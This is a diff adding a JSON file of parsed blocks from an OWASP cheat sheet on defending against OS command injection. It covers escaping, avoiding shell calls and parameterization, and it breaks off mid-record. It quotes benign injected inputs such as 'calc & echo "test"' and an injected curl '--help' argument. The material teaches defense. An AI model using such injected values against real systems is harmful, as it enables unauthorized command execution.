@@ -1,0 +1,2312 @@
+[
+  {
+    "block_id": "ver_b497005071ae_b00000",
+    "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+    "version_id": "ver_b497005071ae",
+    "block_idx": 0,
+    "file_format": "MARKDOWN",
+    "block_type": "heading",
+    "text_content": "# OS Command Injection Defense Cheat Sheet",
+    "text_hash": "328b9abb76b1e886225f17acae5ff2acc4c985611490650a5809d99de8fe1b77",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 1,
+      "end_line": 1
+    },
+    "heading_path": [
+      "OS Command Injection Defense Cheat Sheet"
+    ],
+    "heading_level": 1,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_b497005071ae_b00001",
+    "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+    "version_id": "ver_b497005071ae",
+    "block_idx": 1,
+    "file_format": "MARKDOWN",
+    "block_type": "heading",
+    "text_content": "## Introduction",
+    "text_hash": "d753efbab681fa4da82470d9a83b1c202de58f92fd498e77a269c1163bc4714b",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 3,
+      "end_line": 3
+    },
+    "heading_path": [
+      "OS Command Injection Defense Cheat Sheet",
+      "Introduction"
+    ],
+    "heading_level": 2,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_b497005071ae_b00002",
+    "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+    "version_id": "ver_b497005071ae",
+    "block_idx": 2,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "Command injection (or OS Command Injection) is a type of injection where software that constructs a system command using externally influenced input does not correctly neutralize the input from special elements that can modify the initially intended command.",
+    "text_hash": "a22fba0d304254299c2cfbf9b8bd807f1b20585b25947c53ff6c24fd5ab83386",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 5,
+      "end_line": 5
+    },
+    "heading_path": [
+      "OS Command Injection Defense Cheat Sheet",
+      "Introduction"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_b497005071ae_b00003",
+    "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+    "version_id": "ver_b497005071ae",
+    "block_idx": 3,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "For example, if the supplied value is:",
+    "text_hash": "821fead19592493357c442f9d3e14fafedd9f426accdbda6d0f485fa4300d7e5",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 7,
+      "end_line": 7
+    },
+    "heading_path": [
+      "OS Command Injection Defense Cheat Sheet",
+      "Introduction"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_b497005071ae_b00004",
+    "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+    "version_id": "ver_b497005071ae",
+    "block_idx": 4,
+    "file_format": "MARKDOWN",
+    "block_type": "code",
+    "text_content": "``` shell\ncalc\n```",
+    "text_hash": "80df9d9c292f937c20b185f470dceec2144d6b24668ae38b2db2e7b3b7870f24",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 9,
+      "end_line": 11
+    },
+    "heading_path": [
+      "OS Command Injection Defense Cheat Sheet",
+      "Introduction"
+    ],
+    "heading_level": null,
+    "code_language": "shell",
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_b497005071ae_b00005",
+    "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+    "version_id": "ver_b497005071ae",
+    "block_idx": 5,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "when typed in a Windows command prompt, the application *Calculator* is displayed.",
+    "text_hash": "83629b4138b988f60be5ef41d56546253026599ba790b25b11606ba5f1ad2dfa",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 13,
+      "end_line": 13
+    },
+    "heading_path": [
+      "OS Command Injection Defense Cheat Sheet",
+      "Introduction"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_b497005071ae_b00006",
+    "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+    "version_id": "ver_b497005071ae",
+    "block_idx": 6,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "However, if the supplied value has been tampered with, and now it is:",
+    "text_hash": "359598804302d1eb60cb12e59e77ab2359bd6260466de36422f426b56fcebea6",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 15,
+      "end_line": 15
+    },
+    "heading_path": [
+      "OS Command Injection Defense Cheat Sheet",
+      "Introduction"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_b497005071ae_b00007",
+    "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+    "version_id": "ver_b497005071ae",
+    "block_idx": 7,
+    "file_format": "MARKDOWN",
+    "block_type": "code",
+    "text_content": "``` shell\ncalc & echo \"test\"\n```",
+    "text_hash": "3a07e67829999e7a295f665b58c29678861de51742dd20fb57d9f4f3d1c777ca",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 17,
+      "end_line": 19
+    },
+    "heading_path": [
+      "OS Command Injection Defense Cheat Sheet",
+      "Introduction"
+    ],
+    "heading_level": null,
+    "code_language": "shell",
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_b497005071ae_b00008",
+    "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+    "version_id": "ver_b497005071ae",
+    "block_idx": 8,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "when executed, it changes the meaning of the initial intended value.",
+    "text_hash": "47307a8ad1df183a63712617a65417b02dd85d29038ee895a73789266669fec4",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 21,
+      "end_line": 21
+    },
+    "heading_path": [
+      "OS Command Injection Defense Cheat Sheet",
+      "Introduction"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_b497005071ae_b00009",
+    "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+    "version_id": "ver_b497005071ae",
+    "block_idx": 9,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "Now, both the *Calculator* application and the value *test* are displayed:",
+    "text_hash": "ff6923d300b0ffcf115883531da7d80643829f474e72fedc676347f113e9627f",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 23,
+      "end_line": 23
+    },
+    "heading_path": [
+      "OS Command Injection Defense Cheat Sheet",
+      "Introduction"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_b497005071ae_b00010",
+    "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+    "version_id": "ver_b497005071ae",
+    "block_idx": 10,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "![CommandInjection](../assets/OS_Command_Injection_Defense_Cheat_Sheet_CmdInjection.png)",
+    "text_hash": "fd4793b8f3068a50b5e7310014043a4da1ba2dd8b20231cbec5aaebbb98cb162",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 25,
+      "end_line": 25
+    },
+    "heading_path": [
+      "OS Command Injection Defense Cheat Sheet",
+      "Introduction"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_b497005071ae_b00011",
+    "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+    "version_id": "ver_b497005071ae",
+    "block_idx": 11,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "The problem is exacerbated if the compromised process does not follow the principle of least privileges and attacker-controlled commands end up running with special system privileges that increase the amount of damage.",
+    "text_hash": "2a57520ee02bbcb96e4e04ead094e2b7ca39d20ec68a43892fc17028a4a3b245",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 27,
+      "end_line": 27
+    },
+    "heading_path": [
+      "OS Command Injection Defense Cheat Sheet",
+      "Introduction"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_b497005071ae_b00012",
+    "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+    "version_id": "ver_b497005071ae",
+    "block_idx": 12,
+    "file_format": "MARKDOWN",
+    "block_type": "heading",
+    "text_content": "### Argument Injection",
+    "text_hash": "5aeac06e9f6de066353b267e73c298c6e0dda7d2951958b6bfa33c94c9da61bd",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 29,
+      "end_line": 29
+    },
+    "heading_path": [
+      "OS Command Injection Defense Cheat Sheet",
+      "Introduction",
+      "Argument Injection"
+    ],
+    "heading_level": 3,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_b497005071ae_b00013",
+    "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+    "version_id": "ver_b497005071ae",
+    "block_idx": 13,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "Every OS Command Injection is also an Argument Injection. In this type of attacks, user input can be passed as arguments while executing a specific command.",
+    "text_hash": "3c883ace2cd8b2896dedd25f6ce35b10053bef234d570f3da776185c00229c5f",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 31,
+      "end_line": 31
+    },
+    "heading_path": [
+      "OS Command Injection Defense Cheat Sheet",
+      "Introduction",
+      "Argument Injection"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_b497005071ae_b00014",
+    "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+    "version_id": "ver_b497005071ae",
+    "block_idx": 14,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "For example, if the user input is passed through an escape function to escape certain characters like `&`, `|`, `;`, etc.",
+    "text_hash": "13132c8b7ff83297545be9a51fcb4b042bd0ec8ba3cf96916ac76554c04d475f",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 33,
+      "end_line": 33
+    },
+    "heading_path": [
+      "OS Command Injection Defense Cheat Sheet",
+      "Introduction",
+      "Argument Injection"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_b497005071ae_b00015",
+    "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+    "version_id": "ver_b497005071ae",
+    "block_idx": 15,
+    "file_format": "MARKDOWN",
+    "block_type": "code",
+    "text_content": "```php\n\nsystem(\"curl \" . escape($url));\n```",
+    "text_hash": "7cbf7339e8fe3e045c9948861bd64dc33ff99326c9b62541f3b559f27c23f3c9",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 35,
+      "end_line": 38
+    },
+    "heading_path": [
+      "OS Command Injection Defense Cheat Sheet",
+      "Introduction",
+      "Argument Injection"
+    ],
+    "heading_level": null,
+    "code_language": "php",
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_b497005071ae_b00016",
+    "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+    "version_id": "ver_b497005071ae",
+    "block_idx": 16,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "which will prevent an attacker to run other commands.",
+    "text_hash": "068f966228674cc2dc68fa3707f76483b59fd2fdda81cf3af93d6de806013dab",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 40,
+      "end_line": 40
+    },
+    "heading_path": [
+      "OS Command Injection Defense Cheat Sheet",
+      "Introduction",
+      "Argument Injection"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_b497005071ae_b00017",
+    "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+    "version_id": "ver_b497005071ae",
+    "block_idx": 17,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "However, if the attacker controlled string contains an additional argument of the `curl` command:",
+    "text_hash": "c4a30f4f47fd8b2559a2ad3188415f6fe984e6c8ae6a934eb87cc61c834cbe69",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 42,
+      "end_line": 42
+    },
+    "heading_path": [
+      "OS Command Injection Defense Cheat Sheet",
+      "Introduction",
+      "Argument Injection"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_b497005071ae_b00018",
+    "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+    "version_id": "ver_b497005071ae",
+    "block_idx": 18,
+    "file_format": "MARKDOWN",
+    "block_type": "code",
+    "text_content": "```php\n\nsystem(\"curl \" . escape(\"--help\"))\n```",
+    "text_hash": "56a80f81aa2042cac2072b31d211838da6505ac7f0a2d4272d3e33dd70cd9e39",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 44,
+      "end_line": 47
+    },
+    "heading_path": [
+      "OS Command Injection Defense Cheat Sheet",
+      "Introduction",
+      "Argument Injection"
+    ],
+    "heading_level": null,
+    "code_language": "php",
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_b497005071ae_b00019",
+    "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+    "version_id": "ver_b497005071ae",
+    "block_idx": 19,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "Now when the above code is executed, it will show the output of `curl --help`.",
+    "text_hash": "4031ce2adecb9f8b86325716d4550965373a90b52f4827f84bb4c4ab2d00cfd7",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 49,
+      "end_line": 49
+    },
+    "heading_path": [
+      "OS Command Injection Defense Cheat Sheet",
+      "Introduction",
+      "Argument Injection"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_b497005071ae_b00020",
+    "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+    "version_id": "ver_b497005071ae",
+    "block_idx": 20,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "Depending upon the system command used, the impact of an Argument injection attack can range from **Information Disclosure** to critical **Remote Code Execution**.",
+    "text_hash": "e48bb38e1d0e7a9b84c47b643223d4c4457637ab23d1e72779b7286a7a27bbd2",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 51,
+      "end_line": 51
+    },
+    "heading_path": [
+      "OS Command Injection Defense Cheat Sheet",
+      "Introduction",
+      "Argument Injection"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_b497005071ae_b00021",
+    "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+    "version_id": "ver_b497005071ae",
+    "block_idx": 21,
+    "file_format": "MARKDOWN",
+    "block_type": "heading",
+    "text_content": "## Primary Defenses",
+    "text_hash": "6481df89cf6ea2c7e844d3abc37813b1950ed7b28b9eefbdd4b213e39f152431",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 53,
+      "end_line": 53
+    },
+    "heading_path": [
+      "OS Command Injection Defense Cheat Sheet",
+      "Primary Defenses"
+    ],
+    "heading_level": 2,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_b497005071ae_b00022",
+    "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+    "version_id": "ver_b497005071ae",
+    "block_idx": 22,
+    "file_format": "MARKDOWN",
+    "block_type": "heading",
+    "text_content": "### Defense Option 1: Avoid calling OS commands directly",
+    "text_hash": "28f86ac3461dbe6dd6564f704f93b2495fe1f21dab6b61708903d54fbabbdaed",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 55,
+      "end_line": 55
+    },
+    "heading_path": [
+      "OS Command Injection Defense Cheat Sheet",
+      "Primary Defenses",
+      "Defense Option 1: Avoid calling OS commands directly"
+    ],
+    "heading_level": 3,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_b497005071ae_b00023",
+    "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+    "version_id": "ver_b497005071ae",
+    "block_idx": 23,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "The primary defense is to avoid calling OS commands directly. Built-in library functions are a very good alternative to OS Commands, as they cannot be manipulated to perform tasks other than those it is intended to do.",
+    "text_hash": "93edf0cf2ba4a509f2dd153cd8c56367b0d7537f0b7fdb36d63ef9bfd43f5054",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 57,
+      "end_line": 57
+    },
+    "heading_path": [
+      "OS Command Injection Defense Cheat Sheet",
+      "Primary Defenses",
+      "Defense Option 1: Avoid calling OS commands directly"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_b497005071ae_b00024",
+    "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+    "version_id": "ver_b497005071ae",
+    "block_idx": 24,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "For example use `mkdir()` instead of `system(\"mkdir /dir_name\")`.",
+    "text_hash": "f05c6da14a35cd90cdbe44c94ff69fd7c813eae100f4dffdcaaf02bf7baf3b0e",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 59,
+      "end_line": 59
+    },
+    "heading_path": [
+      "OS Command Injection Defense Cheat Sheet",
+      "Primary Defenses",
+      "Defense Option 1: Avoid calling OS commands directly"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_b497005071ae_b00025",
+    "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+    "version_id": "ver_b497005071ae",
+    "block_idx": 25,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "If there are available libraries or APIs for the language you use, this is the preferred method.",
+    "text_hash": "9c2d07cd5abed0a623fdeb06c880f737136093698cd7bf29cc9bdb1d7962ce16",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 61,
+      "end_line": 61
+    },
+    "heading_path": [
+      "OS Command Injection Defense Cheat Sheet",
+      "Primary Defenses",
+      "Defense Option 1: Avoid calling OS commands directly"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_b497005071ae_b00026",
+    "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+    "version_id": "ver_b497005071ae",
+    "block_idx": 26,
+    "file_format": "MARKDOWN",
+    "block_type": "heading",
+    "text_content": "### Defense option 2: Escape values added to OS commands specific to each OS",
+    "text_hash": "528cdbee816a0b781968c0a1a04e44e7208cedb5dbc0c10a0d281f7a209251c6",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 63,
+      "end_line": 63
+    },
+    "heading_path": [
+      "OS Command Injection Defense Cheat Sheet",
+      "Primary Defenses",
+      "Defense option 2: Escape values added to OS commands specific to each OS"
+    ],
+    "heading_level": 3,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_b497005071ae_b00027",
+    "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+    "version_id": "ver_b497005071ae",
+    "block_idx": 27,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "For examples, see [escapeshellarg()](https://www.php.net/manual/en/function.escapeshellarg.php) in PHP.",
+    "text_hash": "cae0163c93d6b70780fed4d6ae960980e2c1358cab0f0cec7a5e6eefc68187ee",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 65,
+      "end_line": 65
+    },
+    "heading_path": [
+      "OS Command Injection Defense Cheat Sheet",
+      "Primary Defenses",
+      "Defense option 2: Escape values added to OS commands specific to each OS"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_b497005071ae_b00028",
+    "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+    "version_id": "ver_b497005071ae",
+    "block_idx": 28,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "The `escapeshellarg()` surrounds the user input in single quotes, so if the malformed user input is something like `& echo \"hello\"`, the final output will be like `calc '& echo \"hello\"'` which will be parsed as a single argument to the command `calc`.",
+    "text_hash": "4635375137580e1b91caf5e75137d755276540cb185281e39a6cc38f82533870",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 67,
+      "end_line": 67
+    },
+    "heading_path": [
+      "OS Command Injection Defense Cheat Sheet",
+      "Primary Defenses",
+      "Defense option 2: Escape values added to OS commands specific to each OS"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_b497005071ae_b00029",
+    "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+    "version_id": "ver_b497005071ae",
+    "block_idx": 29,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "Even though `escapeshellarg()` prevents OS Command Injection, an attacker can still pass a single argument to the command.",
+    "text_hash": "23e3ea67f08ffa3afcd15b13e2a00b61929c989406b839294a863bfbdf6887cb",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 69,
+      "end_line": 69
+    },
+    "heading_path": [
+      "OS Command Injection Defense Cheat Sheet",
+      "Primary Defenses",
+      "Defense option 2: Escape values added to OS commands specific to each OS"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_b497005071ae_b00030",
+    "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+    "version_id": "ver_b497005071ae",
+    "block_idx": 30,
+    "file_format": "MARKDOWN",
+    "block_type": "heading",
+    "text_content": "### Defense option 3: Parameterization in conjunction with Input Validation",
+    "text_hash": "8b68b778250694a08824240c2c86b764ab20a99ead0b7511bff94a13c0ba7a00",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 71,
+      "end_line": 71
+    },
+    "heading_path": [
+      "OS Command Injection Defense Cheat Sheet",
+      "Primary Defenses",
+      "Defense option 3: Parameterization in conjunction with Input Validation"
+    ],
+    "heading_level": 3,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_b497005071ae_b00031",
+    "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+    "version_id": "ver_b497005071ae",
+    "block_idx": 31,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "If calling a system command that incorporates user-supplied cannot be avoided, the following two layers of defense should be used within software to prevent attacks:",
+    "text_hash": "f0ebc204968a2ec0e9ba8996555d420a595854fe9c5e6b8e298ed640594a11b7",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 73,
+      "end_line": 73
+    },
+    "heading_path": [
+      "OS Command Injection Defense Cheat Sheet",
+      "Primary Defenses",
+      "Defense option 3: Parameterization in conjunction with Input Validation"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_b497005071ae_b00032",
+    "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+    "version_id": "ver_b497005071ae",
+    "block_idx": 32,
+    "file_format": "MARKDOWN",
+    "block_type": "heading",
+    "text_content": "#### Layer 1",
+    "text_hash": "ffb2c5f2b15680950350b1595ae97752d2fe1800373c9e13db3f978a59a46f8c",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 75,
+      "end_line": 75
+    },
+    "heading_path": [
+      "OS Command Injection Defense Cheat Sheet",
+      "Primary Defenses",
+      "Defense option 3: Parameterization in conjunction with Input Validation",
+      "Layer 1"
+    ],
+    "heading_level": 4,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_b497005071ae_b00033",
+    "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+    "version_id": "ver_b497005071ae",
+    "block_idx": 33,
+    "file_format": "MARKDOWN",
+    "block_type": "paragraph",
+    "text_content": "**Parameterization:** If available, use structured mechanisms that automatically enforce the separation between data and command. These mechanisms can help provide the relevant quoting and encoding.",
+    "text_hash": "2aa8febaee1a54834191b4b819595d942ee03e49b3b5f1deaaa5336877c76dc9",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 77,
+      "end_line": 77
+    },
+    "heading_path": [
+      "OS Command Injection Defense Cheat Sheet",
+      "Primary Defenses",
+      "Defense option 3: Parameterization in conjunction with Input Validation",
+      "Layer 1"
+    ],
+    "heading_level": null,
+    "code_language": null,
+    "lang": null,
+    "table_header_cols": null,
+    "table_rows": null,
+    "continues_from_previous": false,
+    "raw_record": null
+  },
+  {
+    "block_id": "ver_b497005071ae_b00034",
+    "document_id": "doc_owasp_a03_os_command_injection_defense_cheat_sheet",
+    "version_id": "ver_b497005071ae",
+    "block_idx": 34,
+    "file_format": "MARKDOWN",
+    "block_type": "heading",
+    "text_content": "#### Layer 2",
+    "text_hash": "852f1a1abbc1386ee7c10aa0780e7b5637276d530a18a9c1539f90399ef6cb2a",
+    "parser_name": "markdown-it-py",
+    "parser_version": "4.0.0",
+    "locator": {
+      "start_line": 79,
+      "end_line": 79
+    },
+    "heading_path": [
+      "OS Command Injection Defense Cheat Sheet",
+      "Primary Defenses",
+      "Defense option 3: Parameterization in conjunction with Input Validation",
+      "Layer 2"
+    ],
+    "heading_level": 4,
+    "code_language": null,
+    "lang": null,
